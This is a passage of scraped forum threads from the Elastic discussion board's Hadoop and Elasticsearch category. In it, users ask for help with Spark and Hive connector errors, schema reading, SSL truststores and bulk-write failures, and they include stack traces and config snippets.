    "body": "I am trying to read data from Elasticsearch via Spark Scala: Scala 2.11.8, Spark 2.3.0, Elasticsearch 5.6.8 To Connect -- spark2-shell --jars elasticsearch-spark-20_2.11-5.6.8.jar val df = spark.read.format(\"org.elasticsearch.spark.sql\").option(\"es.nodes\", \"xxxxxxx\").option(\"es.port\", \"xxxx\").option(\"es.net.http.auth.user\",\"xxxxx\").option(\"spark.serializer\", \"org.apache.spark.serializer.KryoSerializer\").option(\"es.net.http.auth.pass\", \"xxxxxx\").option(\"es.net.ssl\", \"true\").option(\"es.nodes.wan.only\", \"true\").option(\"es.net.ssl.cert.allow.self.signed\", \"true\").option(\"es.net.ssl.truststore.location\", \"xxxxx\").option(\"es.net.ssl.truststore.pass\", \"xxxxx\").option(\"es.read.field.as.array.include\",\"true\").option(\"pushdown\", \"true\").option(\"es.read.field.as.array.include\",\"a4,a4.a41,a4.a42,a4.a43,a4.a43.a431,a4.a43.a432,a4.a44,a4.a45\").load(\"<index_name>\") Schema as below |-- a1: string (nullable = true) |-- a2: string (nullable = true) |-- a3: struct (nullable = true) | |-- a31: integer (nullable = true) | |-- a32: struct (nullable = true) |-- a4: array (nullable = true) | |-- element: struct (containsNull = true) | | |-- a41: string (nullable = true) | | |-- a42: string (nullable = true) | | |-- a43: struct (nullable = true) | | | |-- a431: string (nullable = true) | | | |-- a432: string (nullable = true) | | |-- a44: string (nullable = true) | | |-- a45: string (nullable = true) |-- a8: string (nullable = true) |-- a9: array (nullable = true) | |-- element: struct (containsNull = true) | | |-- a91: string (nullable = true) | | |-- a92: string (nullable = true) |-- a10: string (nullable = true) |-- a11: timestamp (nullable = true) Though I am able to read data from direct columns and nested schema level 1 (i.e a9 or a3 columns) via command: df.select(explode($\"a9\").as(\"exploded\")).select(\"exploded.*\").show Problem is occuring when I am trying to read a4 elements as its throwing me below error: : scala.MatchError: Buffer() (of class scala.collection.convert.Wrappers$JListWrapper) at org.apache.spark.sql.catalyst.CatalystTypeConverters$StringConverter$.toCatalystImpl(CatalystTypeConverters.scala:276) at org.apache.spark.sql.catalyst.CatalystTypeConverters$StringConverter$.toCatalystImpl(CatalystTypeConverters.scala:275) at org.apache.spark.sql.catalyst.CatalystTypeConverters$CatalystTypeConverter.toCatalyst(CatalystTypeConverters.scala:103) at org.apache.spark.sql.catalyst.CatalystTypeConverters$StructConverter.toCatalystImpl(CatalystTypeConverters.scala:241) at org.apache.spark.sql.catalyst.CatalystTypeConverters$StructConverter.toCatalystImpl(CatalystTypeConverters.scala:231) at org.apache.spark.sql.catalyst.CatalystTypeConverters$CatalystTypeConverter.toCatalyst(CatalystTypeConverters.scala:103) at org.apache.spark.sql.catalyst.CatalystTypeConverters$ArrayConverter$anonfun$toCatalystImpl$2.apply(CatalystTypeConverters.scala:164) at scala.collection.TraversableLike$anonfun$map$1.apply(TraversableLike.scala:234) at scala.collection.TraversableLike$anonfun$map$1.apply(TraversableLike.scala:234)............ Anything I am doing wrong or any steps I am missing? Please Help",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e310ea56-6565-41c0-a524-ee165e4fb033",
    "url": "https://discuss.elastic.co/t/behaviour-of-the-java-spark-api-javaesspark-savetoes-background-or-not/220215",
    "title": "Behaviour of the Java Spark API : JavaEsSpark.saveToEs (background or not)",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "sebastienf",
    "date": "February 20, 2020, 3:27pm February 27, 2020, 4:28pm March 26, 2020, 4:28pm",
    "body": "Hi, In a Spark Streaming Job, I am using JavaEsSpark.saveToEs to bulk documents into ES indices. So far so good, but I was wondering about its behaviour. Indeed, I noticed that the code after the JavaEsSpark call seems to be executed whereas it is not over... if (...) { JavaEsSpark.saveToEs(message, index_pattern+\"_{target_index}/{target_type}\"); } // at last, we commit the offset ranges ((CanCommitOffsets) messages.inputDStream()).commitAsync(offsetRanges); As you can see, I commit kafka offset after saveToEs, but sometimes, saveToEs failed (what so ever issue) and offsets are still commited ! So, if anyone knows sharply the behaviour of this API, I would be pleased Thanks a lot.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "756b9499-a6a3-41a5-b9a5-66d71ab91925",
    "url": "https://discuss.elastic.co/t/error-while-inserting-data-from-hadoop-to-es/219371",
    "title": "Error while inserting data from Hadoop to ES",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "zizake",
    "date": "February 14, 2020, 1:55pm February 17, 2020, 9:18am February 27, 2020, 4:01pm March 26, 2020, 4:01pm",
    "body": "Hello, ES: 6.2.3 Hadoop Plugin 6.2.3 I have an external table I want to be populated with some data from a Hive table (Parquet files) When I execute: INSERT OVERWRITE TABLE external_es SELECT field-name1,field-name2,...,field-name20 FROM parquet limit 999000000; I get: Status: Failed Vertex failed, vertexName=Reducer 2, vertexId=vertex_1573460958877_2186_1_01, diagnostics=[Task failed, taskId=task_1573460958877_2186_1_01_000000, diagnostics=[TaskAttempt 0 failed, info=[Error: Failure while running task:java.lang.RuntimeException: org.apache.hadoop.hive.ql.metadata.HiveException: Hive Runtime Error while processing row (tag=0) {\"key\":{},\"value\":{\"_col0\":\"1.0\",\"_col1\":4,\"_col2\":1581674662000,\"_col3\":\"\",\"_col4\":\"d4b5cf34f7d0ee4a15c0b231f3e2aaa2\",\"_col5\":\"8255bb0f2594fc19a3f752286f8a5a76\",\"_col6\":100,\"_col7\":\"XXXXXXXXXXXXXXXXXXx\",\"_col8\":\"\",\"_col9\":\"\",\"_col10\":\"10.0.18362.256\",\"_col11\":\"\",\"_col12\":\"\",\"_col13\":\"XXXXXXXXXXXXXXXXXXx\",\"_col14\":null,\"_col15\":\"clean\",\"_col16\":\"12.22.197.186\",\"_col17\":\"ore.amz\",\"_col18\":\"xxxx\",\"_col19\":\"am_engines\",\"_col20\":\"61dc8483-c8bc-402b-a325-a4dc6fb10567\",\"_col21\":\"e9ebd55d-2b3e-4291-9ba9-d966e619d4c4\",\"_col22\":null,\"_col23\":null,\"_col24\":null,\"_col25\":true,\"_col26\":\"x64\",\"_col27\":\"XXX\",\"_col28\":{\"lat\":34.281,\"lon\":-119.1702},\"_col29\":{\"region_name\":\"California\",\"country_code\":\"US\",\"country_name\":\"United States\",\"city\":\"Ventura\",\"continent_code\":\"NA\",\"asn\":3421,\"organization\":\"Company\"}}} at org.apache.hadoop.hive.ql.exec.tez.TezProcessor.initializeAndRunProcessor(TezProcessor.java:173) at org.apache.hadoop.hive.ql.exec.tez.TezProcessor.run(TezProcessor.java:139) at org.apache.tez.runtime.LogicalIOProcessorRuntimeTask.run(LogicalIOProcessorRuntimeTask.java:347) at org.apache.tez.runtime.task.TezTaskRunner$TaskRunnerCallable$1.run(TezTaskRunner.java:194) at org.apache.tez.runtime.task.TezTaskRunner$TaskRunnerCallable$1.run(TezTaskRunner.java:185) at java.security.AccessController.doPrivileged(Native Method) at javax.security.auth.Subject.doAs(Subject.java:422) at org.apache.hadoop.security.UserGroupInformation.doAs(UserGroupInformation.java:1869) at org.apache.tez.runtime.task.TezTaskRunner$TaskRunnerCallable.callInternal(TezTaskRunner.java:185) at org.apache.tez.runtime.task.TezTaskRunner$TaskRunnerCallable.callInternal(TezTaskRunner.java:181) at org.apache.tez.common.CallableWithNdc.call(CallableWithNdc.java:36) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) Caused by: org.apache.hadoop.hive.ql.metadata.HiveException: Hive Runtime Error while processing row (tag=0) {\"key\":{},\"value\":{\"_col0\":\"1.0\",\"_col1\":4,\"_col2\":1581674662000,\"_col3\":\"\",\"_col4\":\"d4b5cf34f7d0ee4a15c0b231f3e2aaa2\",\"_col5\":\"8255bb0f2594fc19a3f752286f8a5a76\",\"_col6\":100,\"_col7\":\"\",\"_col8\":\"\",\"_col9\":\"\",\"_col10\":\"10.0.18362.256\",\"_col11\":\"\",\"_col12\":\"\",\"_col13\":\"213123241234412#fdfdf\",\"_col14\":null,\"_col15\":\"clean\",\"_col16\":\"12.22.197.186\",\"_col17\":\"ore.amz\",\"_col18\":\"xxxx\",\"_col19\":\"fact\",\"_col20\":\"61dc8483-c8bc-402b-a325-a4dc6fb10567\",\"_col21\":\"e9ebd55d-2b3e-4291-9ba9-d966e619d4c4\",\"_col22\":null,\"_col23\":null,\"_col24\":null,\"_col25\":true,\"_col26\":\"x64\",\"_col27\":\"XXXX\",\"_col28\":{\"lat\":34.281,\"lon\":-119.1702},\"_col29\":{\"region_name\":\"California\",\"country_code\":\"US\",\"country_name\":\"United States\",\"city\":\"Ventura\",\"continent_code\":\"NA\",\"asn\":3212,\"organization\":\"Company\"}}} at org.apache.hadoop.hive.ql.exec.tez.ReduceRecordSource$GroupIterator.next(ReduceRecordSource.java:352) at org.apache.hadoop.hive.ql.exec.tez.ReduceRecordSource.pushRecord(ReduceRecordSource.java:237) at org.apache.hadoop.hive.ql.exec.tez.ReduceRecordProcessor.run(ReduceRecordProcessor.java:266) at org.apache.hadoop.hive.ql.exec.tez.TezProcessor.initializeAndRunProcessor(TezProcessor.java:150) ... 14 more Caused by: org.elasticsearch.hadoop.EsHadoopException: Could not write all entries for bulk operation [1/951]. Error sample (first [5] error messages): failed to parse [origin_ip] Bailing out... at org.elasticsearch.hadoop.rest.bulk.BulkProcessor.flush(BulkProcessor.java:475) at org.elasticsearch.hadoop.rest.bulk.BulkProcessor.add(BulkProcessor.java:106) at org.elasticsearch.hadoop.rest.RestRepository.doWriteToIndex(RestRepository.java:187) at org.elasticsearch.hadoop.rest.RestRepository.writeProcessedToIndex(RestRepository.java:183) at org.elasticsearch.hadoop.hive.EsHiveOutputFormat$EsHiveRecordWriter.write(EsHiveOutputFormat.java:63) at org.apache.hadoop.hive.ql.exec.FileSinkOperator.process(FileSinkOperator.java:763) at org.apache.hadoop.hive.ql.exec.Operator.forward(Operator.java:841) at org.apache.hadoop.hive.ql.exec.LimitOperator.process(LimitOperator.java:54) at org.apache.hadoop.hive.ql.exec.Operator.forward(Operator.java:841) at org.apache.hadoop.hive.ql.exec.SelectOperator.process(SelectOperator.java:88) at org.apache.hadoop.hive.ql.exec.tez.ReduceRecordSource$GroupIterator.next(ReduceRecordSource.java:343) What I actually don't understand is why I receive this error after inserting with success about 9M rows into ES index (the mapping in ES is IP). It says failed to parse [origin_ip]. origin_ip field corresponds to \"_col16\" and as it can be seen in JSON it's a valid IP (\"_col16\":\"12.22.197.186\"). Does anyone have a clue ? Thanks!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "531f66e5-6ede-476f-a65d-5c6bc37e0d9e",
    "url": "https://discuss.elastic.co/t/spark-sql-not-reading-all-the-columns-from-index/215518",
    "title": "Spark sql not reading all the columns from index",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "raghu2",
    "date": "January 17, 2020, 8:27pm January 28, 2020, 9:44pm February 25, 2020, 9:44pm February 25, 2020, 9:44pm",
    "body": "I am using pyspark 1.6.1 using elasticsearch-spark-13_2.10-7.5.1.jar to read data from ES 5.6.8 running on AWS Es service. I am able to use \"es.read.field.include\" to extract only the columns we need or also register the index as temp table and select only the columns we need. The source index mapping is not auto updated and any columns that are not in the index mapping are not available to extract from spark. How do we read all the columns from ES using spark. I tried to pass es.query = {\"query\": {\"match_all\": {}} }\" as well but still it uses the index mapping for the schema. Is there a way i can extract the whole index and create a data frame on that data.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1530a821-6248-4599-925e-bf7db19ebdd3",
    "url": "https://discuss.elastic.co/t/help-for-value-to-use-additionalremoterepository-url-config-in-dependency-management-for-interpreter-spark/218458",
    "title": "Help for value to use additionalRemoteRepository URL config in Dependency Management for Interpreter Spark",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "larryzhu",
    "date": "February 9, 2020, 2:52am March 8, 2020, 2:52am",
    "body": "I am stuck adding the following class to zeppelin: https://mvnrepository.com/artifact/org.elasticsearch/elasticsearch-spark-20_2.10/7.5.2 What is the syntax for zeppelin.dep.additionalRemoteRepository to add mvnrepository.com here? I also deployed a local version of apache archive, and tried https://archiva.secscs.com/repository/internal (where archiva.secscs.com is my local DNS name), but none worked. Can you please give a hint what is the URL value I can put in the additionalRemoteRepository URL? Thanks, --Larry",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "72b835e9-9b0a-4b71-90b9-a6abe96e0524",
    "url": "https://discuss.elastic.co/t/writing-to-new-index-using-spark-with-mapping-disabled/218072",
    "title": "Writing to new index using Spark with mapping disabled",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "tchu01",
    "date": "February 6, 2020, 12:29am February 6, 2020, 4:49pm March 5, 2020, 4:49pm",
    "body": "Hi all, I am using AWS EMR PySpark to write to AWS ElasticSearch (cluster version 6.3) using the elasticsearch-hadoop-7.5.2.jar from https://www.elastic.co/downloads/hadoop. I am trying to write to a new index with mapping disabled (as mentioned here: https://www.elastic.co/guide/en/elasticsearch/reference/6.3/enabled.html). Is this possible? None of the configuration (https://www.elastic.co/guide/en/elasticsearch/hadoop/6.3/configuration.html) seems to allow this. Currently, I have to create the index first with mapping disabled, and then write to that index. However, it would be awesome to just automatically create the index with mapping disabled as part of the Spark write. Looking forward to discuss, Tim",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b3aab388-1320-4a0e-adfb-12b0fd610d35",
    "url": "https://discuss.elastic.co/t/spark-2-4-to-elasticsearch-prevent-data-loss-during-dataproc-nodes-decommissioning/216076",
    "title": "Spark 2.4 to Elasticsearch : prevent data loss during dataproc nodes decommissioning?",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "fredrouvier",
    "date": "January 22, 2020, 2:04pm January 28, 2020, 9:51pm February 25, 2020, 9:59pm",
    "body": "My technical task is to synchronize data from GCS (Google Cloud Storage) to our Elasticsearch cluster. We use Apache Spark 2.4 with the Elastic Hadoop connector on a Google dataproc cluster (autoscaling enabled). During the execution, if the dataproc cluster downscaled, all tasks on the decommissioned node are lost and the processed data on this node are never pushed to elastic. This problem does not exist when I save to GCS or HDFS for example. How to make resilient this task even when nodes are decommissioned ? An extract of the stacktrace : Lost task 50.0 in stage 2.3 (TID 427, xxxxxxx-sw-vrb7.c.xxxxxxx, executor 43): FetchFailed(BlockManagerId(30, xxxxxxx-w-23.c.xxxxxxx, 7337, None), shuffleId=0, mapId=26, reduceId=170, message=org.apache.spark.shuffle.FetchFailedException: Failed to connect to xxxxxxx-w-23.c.xxxxxxx:7337 Caused by: java.net.UnknownHostException: xxxxxxx-w-23.c.xxxxxxx Task 50.0 in stage 2.3 (TID 427) failed, but the task will not be re-executed (either because the task failed with a shuffle data fetch failure, so the previous stage needs to be re-run, or because a different copy of the task has already succeeded). Thanks. Fred",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3a3837f6-dd0b-435e-bcef-c1a9cae4bb4e",
    "url": "https://discuss.elastic.co/t/spark-structured-streaming-json-serialization/214661",
    "title": "Spark Structured Streaming JSON Serialization",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "execdd17",
    "date": "January 13, 2020, 1:49pm January 28, 2020, 9:48pm February 25, 2020, 9:49pm",
    "body": "Hey Everyone, I hope this question hasn't been asked before, I looked around quite a bit before posting. If I missed it, sorry! I'm trying to use the org.elasticsearch.spark.sql structured streaming sink for ES, and am running into some challenges when my column contains a string literal of valid JSON. I have one column called combined. When the documents are written to ES they look like this: \"_source\" : { \"combined\" : \"\"\"{\"sparkTimestamp\":\"2020-01-08T15:42:24.890Z\",\"@timestamp\":\"2020-01-08T15:39:40.583Z\",\"@metadata\":{\"beat\":\"winlogbeat\",\"type\":\"_doc\",\"version\":\"7.4.2\",\"topic\":\"ingest-winlogbeat\"},\"host\":{\"hostname\":\"A HOSTNAME\"................ truncated for brevity As you can see, it's assuming that I have a normal string, and is nice enough to escape it for me too. What I am really after though, is for the JSON string within the combined column to be the _source. It looks like this is possible with the older RDD approach, but I didn't see any way to make it work within the context of this sink. Is this possible? If there is another way, what are the message delivery guarantees? If you're wondering why I'm doing this, then I'm happy to briefly explain. I'm using winlogbeat as a source, and while it is ECS compliant, a vast number of fields are within a custom extension. In addition, depending on the event, the fields will change. If I try to account for this in a spark managed(SQL) table, it's going to be very difficult because of the sparsity and sheer number of fields. To alleviate this I parsed out core ECS fields and retained the original JSON from winlogbeat. Now that the raw table has been established, I want to index the original JSON into ES. This is effectively the combined column. Any insight would be appreciated. Thanks!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "15b57425-c1c5-45d4-90ba-3bd9c7310e80",
    "url": "https://discuss.elastic.co/t/elastic-spark-errorhandler/215170",
    "title": "Elastic Spark ErrorHandler",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "itssujan",
    "date": "January 15, 2020, 4:14pm January 27, 2020, 3:49pm February 24, 2020, 3:49pm",
    "body": "Hello, Im using elasticsearch-hadoop to index our dataframe via spark sink. I have used the configurations as mentioned in https://www.elastic.co/guide/en/elasticsearch/hadoop/current/errorhandlers.html to configure a custom ErrorHandler. But I fail to get the errorhandler activated when an error occurs. Doesnt it work when we use or.elasticsearch.spark classes for processing?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6fee4a45-e450-4cfa-b3e9-cbf12f7122ab",
    "url": "https://discuss.elastic.co/t/how-to-add-truststore-to-classpath-in-hive/212959",
    "title": "How to add truststore to classpath in Hive",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "oranciog",
    "date": "December 24, 2019, 1:31pm January 6, 2020, 5:57pm February 3, 2020, 5:57pm",
    "body": "Hi, According to documentation, es.net.ssl.truststore.location is trust store location (typically a URL, without a prefix it is interpreted as a classpath entry) My question is how to add a truststore in a hive cli job classpath. I tried the following solutions, none is working: ADD JAR truststore.jks - hive cli command (According to hive cli docs, ADD JAR resources are also added to the Java classpath.) (I've loaded with ADD JAR a jar and is loaded ok). hive.aux.jars.path - setting in hive-site.xml (I've set this to a hdfs location, where I put all the jars needed for the job and the truststore.jks. All jars were loaded correctly, but truststore.jks was not found in classpath, according to es-hadoop plugin). Also, all the examples I've found were with file://, but none of them were showing how to load this file from classpath.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1a61bd00-b65a-4bfa-9416-7b615ecb3857",
    "url": "https://discuss.elastic.co/t/unable-to-index-documents-into-elastic-cloud-hosted-managed-service-on-gcp-using-spark/212135",
    "title": "Unable to index documents into Elastic Cloud hosted managed service on GCP using Spark",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "devender2601",
    "date": "December 17, 2019, 6:18pm December 17, 2019, 10:50am December 17, 2019, 8:51pm December 18, 2019, 1:03pm December 18, 2019, 6:57pm January 6, 2020, 5:47pm February 3, 2020, 5:47pm",
    "body": "Hi, I am trying to insert documents in the index after reading documents from GCP storage. My Elasticsearch flavour on GCP is elastic cloud service hosted by elastic. for this, I am using version 7.5.0. and my Gradle dependencies look like the below:- dependencies { compile group: 'org.apache.spark', name: 'spark-core_2.11', version: '2.3.4' compile group: 'org.apache.spark', name: 'spark-sql_2.11', version: '2.3.4' compile group: 'org.elasticsearch', name: 'elasticsearch-hadoop', version: '7.5.0' compile group: 'org.elasticsearch',name:'elasticsearch',version:'7.5.0' } In code, I am passing username and auth using spark.es.net.http.auth.user & spark.es.net.http.auth.pass property. So, with the same code and dependency, if I just change the hostname to localhost and port no. to 9200 which is different for elastic cloud service, my code is able to successfully insert the documents in the index in the local elastic cluster. but while trying with elastic cloud hostname and 9243 port, I am gettting the weird error Exception in thread \"main\" java.lang.NoClassDefFoundError: org/elasticsearch/spark/sql/api/java/JavaEsSparkSQL at com.cortex.spark.gcpSparktoES.main(gcpSparktoES.java:42) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.spark.deploy.JavaMainApplication.start(SparkApplication.scala:52) at org.apache.spark.deploy.SparkSubmit$.org$apache$spark$deploy$SparkSubmit$$runMain(SparkSubmit.scala:890) at org.apache.spark.deploy.SparkSubmit$.doRunMain$1(SparkSubmit.scala:192) at org.apache.spark.deploy.SparkSubmit$.submit(SparkSubmit.scala:217) at org.apache.spark.deploy.SparkSubmit$.main(SparkSubmit.scala:137) at org.apache.spark.deploy.SparkSubmit.main(SparkSubmit.scala) Caused by: java.lang.ClassNotFoundException: org.elasticsearch.spark.sql.api.java.JavaEsSparkSQL at java.net.URLClassLoader.findClass(URLClassLoader.java:382) at java.lang.ClassLoader.loadClass(ClassLoader.java:418) at java.lang.ClassLoader.loadClass(ClassLoader.java:351) Can you please help me with the solution for it. For your information , same error is coming when i am submitting the job on dataproc cluster on GCP.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "9c95eeac-bdd7-4db8-8f42-99856eef602d",
    "url": "https://discuss.elastic.co/t/spark-to-aws-elasticsearch-service/212246",
    "title": "Spark to AWS ElasticSearch Service",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "yarch",
    "date": "December 18, 2019, 3:56am January 6, 2020, 5:43pm February 3, 2020, 5:58pm",
    "body": "I am running spark on my local machine. I have Elastic Search up and running in AWS-ElasticSearch service. I am trying to follow the documentation specified here: https://www.elastic.co/guide/en/elasticsearch/hadoop/master/spark.html Version of Elasticsearch-spark that I am using is, <dependency> <groupId>org.elasticsearch</groupId> <artifactId>elasticsearch-spark-20_2.10</artifactId> <version>7.5.0</version> </dependency> This is how my SparkConf looks like: SparkConf conf = new SparkConf().setMaster(\"local[*]\").setAppName(properties.getProperty(\"app.name\")) .set(\"es.nodes\", \"search-**********.us-west-1.es.amazonaws.com\") .set(\"es.port\",\"443\") .set(\"es.http.timeout\", \"5m\") .set(\"es.nodes.wan.only\", \"true\"); # Call the method to send logs to ES, assume stringResults to a JavaDStream<Map<String, Object>> object ElasticSearchManager.sendToEs(stringResults); This is how I am trying to store the data in ElasticSearch import static org.elasticsearch.spark.streaming.api.java.JavaEsSparkStreaming.saveToEs; public class ElasticSearchManager { public static void sendToEs(JavaDStream<Map<String, Object>> javaDStream) { ZonedDateTime dateTime = LocalDateTime.now().atZone(ZoneId.systemDefault()); saveToEs(javaDStream, dateTime.format(DateTimeFormatter.ofPattern(\"YYYY-MM-dd\"))); } } This is the error I get org.elasticsearch.hadoop.EsHadoopIllegalArgumentException: Cannot detect ES version - typically this happens if the network/Elasticsearch cluster is not accessible or when targeting a WAN/Cloud instance without the proper setting 'es.nodes.wan.only' at org.elasticsearch.hadoop.rest.InitializationUtils.discoverClusterInfo(InitializationUtils.java:340) at org.elasticsearch.spark.rdd.EsSpark$.doSaveToEs(EsSpark.scala:104) at org.elasticsearch.spark.streaming.EsSparkStreaming$anonfun$doSaveToEs$1.apply(EsSparkStreaming.scala:71) at org.elasticsearch.spark.streaming.EsSparkStreaming$anonfun$doSaveToEs$1.apply(EsSparkStreaming.scala:71) at org.apache.spark.streaming.dstream.DStream.$anonfun$foreachRDD$2(DStream.scala:628) at org.apache.spark.streaming.dstream.DStream.$anonfun$foreachRDD$2$adapted(DStream.scala:628) at org.apache.spark.streaming.dstream.ForEachDStream.$anonfun$generateJob$2(ForEachDStream.scala:51) at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23) at org.apache.spark.streaming.dstream.DStream.createRDDWithLocalProperties(DStream.scala:416) at org.apache.spark.streaming.dstream.ForEachDStream.$anonfun$generateJob$1(ForEachDStream.scala:51) at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23) at scala.util.Try$.apply(Try.scala:213) at org.apache.spark.streaming.scheduler.Job.run(Job.scala:39) at org.apache.spark.streaming.scheduler.JobScheduler$JobHandler.$anonfun$run$1(JobScheduler.scala:257) at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23) at scala.util.DynamicVariable.withValue(DynamicVariable.scala:62) at org.apache.spark.streaming.scheduler.JobScheduler$JobHandler.run(JobScheduler.scala:257) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) Caused by: org.elasticsearch.hadoop.rest.EsHadoopInvalidRequest: [GET] on [] failed; server[search-************.us-west-1.es.amazonaws.com:443] returned [400|Bad Request:] at org.elasticsearch.hadoop.rest.RestClient.checkResponse(RestClient.java:477) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:434) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:428) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:388) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:392) at org.elasticsearch.hadoop.rest.RestClient.get(RestClient.java:168) at org.elasticsearch.hadoop.rest.RestClient.mainInfo(RestClient.java:745) at org.elasticsearch.hadoop.rest.InitializationUtils.discoverClusterInfo(InitializationUtils.java:330) ... 19 more I tried to debug as to what's the issue. And, this is what I found in package org.elasticsearch.hadoop.rest.RestClient.java in line 745 Map<String, Object> result = get(\"\", null); Not sure why they would set the URI in the get method to empty string. Now I am struck at this point and don't have a good path forward. Any help would be appreciated.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "5a015e56-6c27-46b0-b852-cdb1ee6b18a5",
    "url": "https://discuss.elastic.co/t/essparksql-savetoes-circuitbreakingexception-parent-data-too-large-data-for-transport-request/212372",
    "title": "EsSparkSQL.saveToEs() CircuitBreakingException: [parent] Data too large, data for [<transport_request>]",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Enrique_Garcia_Garci",
    "date": "December 18, 2019, 4:45pm January 15, 2020, 4:45pm",
    "body": "I'm trying to get a single line JSON datasource of around some 26M records, apply some logic (two filters and then a \"select\" to get the desired results -6 fields at all-) and save them in ES... so far so good. Tha problem seems to be the EsSparkSQL.saveToEs() which always raises the circuit breaker exception. If this connector is responsible of doing whatever it does (I don't really know why this connector takes that large amount of tasks/jobs to save already \"formated\" data, except it is not JSON) and then save to ES why this exception is raised? Shouldn't it be smart enough to check the max data size and flush the bulk before that limit is exceed? This is the exact exception (bailing out): org.elasticsearch.hadoop.rest.EsHadoopRemoteException: circuit_breaking_exception: [parent] Data too large, data for [<transport_request>] would be [259268254/247.2mb], which is larger than the limit of [254332108/242.5mb], real usage: [258560280/246.5mb], new bytes reserved: [707974/691.3kb], usages [request=0/0b, fielddata=38332/37.4kb, in_flight_requests=1395602/1.3mb, accounting=5724890/5.4mb] I've also tried to set the breaker limit up to 99% but with same result. KO. String payload = \"{\\\"persistent\\\" : {\\\"indices.breaker.total.limit\\\" : \\\"99%\\\"}}\"; StringRequestEntity requestEntity = new StringRequestEntity(payload, \"application/json\", \"UTF-8\"); PutMethod putMethod = new PutMethod(host + CLUSTER_SETTINGS_ENDPOINT); putMethod.setRequestEntity(requestEntity); int statusCode = httpClient.executeMethod(putMethod); If answer is no, how can I fix it? Thanks.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b0b95a07-4c7c-4417-af24-3ebc8723ae7c",
    "url": "https://discuss.elastic.co/t/unable-to-index-the-document-through-es-hadoop-spark-in-local-mode-it-is-working-but-from-cluster-it-is-not-working/211309",
    "title": "Unable to index the document through ES-Hadoop(Spark) : In local mode it is working ,but from cluster it is not working",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Srinivas2",
    "date": "December 11, 2019, 7:53am December 17, 2019, 9:08pm January 14, 2020, 9:08pm",
    "body": "Hello Everyone, Need help on below issue. I am indexing a nested JSON through ES-Hadoop , but it is failing with the below error org.apache.spark.util.TaskCompletionListenerException: Could not write all entries for bulk operation [1/1]. Error sample (first [5] error messages): org.elasticsearch.hadoop.rest.EsHadoopRemoteException: mapper_parsing_exception: failed to parse;org.elasticsearch.hadoop.rest.EsHadoopRemoteException: not_x_content_exception: Compressor detection can only be called on some xcontent bytes or compressed xcontent bytes {\"index\":{}} I am using below code to write the document into AWS-ES. In below code nonModifiedDataFrame always have only one record. documentpath have one Json file(size is around 100 MB) and I have to add indexid and indextimestamp as two columns. If I use sparkContext.textFile(documentpath) to create RDD[String] I am unable to add two more columns in the json , so I took dataframe approach and cleaning some information in Json y using Method replaceDotsWithUnderScore. def indexThroughSpark(spark:SparkSession,indexid:String,documnetPath:String,indexName:String ,indextimestamp:String)={ import spark.implicits._ val nonModifiedDataFrame= spark.read.json(documnetPath) .withColumn(\"indexid\",lit(indexid)) .withColumn(\"indextimestamp\",lit(indextimestamp)) val convertedString:RDD[String] = nonModifiedDataFrame.toJSON.rdd val replacedString = convertedString.map{ line => ModifyKeysForDots().replaceDotsWithUnderScore(line) } val cfg = Map( (\"es.resource\",\"indexfor_spark/_doc\") ) EsSpark.saveJsonToEs(replacedString,cfg) } If I execute the above code in my local environment i.e. master is local it is working fine and I am able to see the no of documents , but if I run the same code in cluster and master as Yarn it is failing . Thanks In advance.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d0c44536-41d1-46d3-a323-91a9b1db9063",
    "url": "https://discuss.elastic.co/t/example-of-spark-eshadoop-query-counting-distinct-host-hostname/211369",
    "title": "Example of Spark/EShadoop query counting distinct host.hostname",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Saas_Cloud_Security",
    "date": "December 10, 2019, 7:34pm January 7, 2020, 7:34pm",
